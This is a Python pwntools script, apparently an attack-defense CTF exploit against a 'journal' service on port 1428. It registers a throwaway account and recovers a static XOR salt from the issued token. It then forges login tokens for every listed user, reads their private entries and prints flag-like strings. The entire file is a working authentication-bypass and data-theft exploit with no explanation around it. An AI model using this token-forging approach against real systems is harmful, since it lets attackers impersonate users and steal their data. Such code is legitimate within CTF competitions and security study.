#!/usr/bin/env python

import re
from pwn import *
import sys

ALPHABET = "24679BCFGKMPQSUW"
PORT = 1428
SALT = 0


def generate_string(len = 16, alph = string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join([random.choice(alph) for _ in range(len)])


def gen_token(login):
    token = ""
    for c in login:
        num = SALT ^ ord(c)
        for i in range(4):
            token += ALPHABET[num % 16]
            num //= 16
    return token

    
def try_login(ip, user):
    r = remote(ip, PORT)
    
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("> ")
    r.sendline(gen_token(user))
    r.recvuntil("> ")
    r.sendline("4")
    data = r.recvuntil("> ")
    
    for line in data.split("\n"):
        if line.startswith("#"):
            r.sendline("2")
            r.recvuntil("> ")
            r.sendline(line[1:])
            data = r.recvuntil("> ")
            print(''.join(re.findall("[A-Z0-9]{31}=", data)))
            sys.stdout.flush()
    r.close()


def main(ip):
    r = remote(ip, PORT)
    
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("> ")
    login = generate_string()
    r.sendline(login)
    data = r.recvuntil("> ")
    token = re.search("token: ([A-Z0-9]+)", data)
    firstgroup = token.group(1)[:4][::-1]
    
    global SALT
    
    for i in firstgroup:
        SALT *= 16
        SALT += ALPHABET.find(i)
        
    SALT ^= ord(login[0])
    
    print >> sys.stderr, "Salt found:", SALT
    
    r.sendline("3")
    data = r.recvuntil("Available")
    r.close()
    
    for user in data.split("\n")[:-1]:
        try_login(ip, user)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: nsychev_journal_staticseed.py ip")
    ip = sys.argv[1]
    
    main(ip)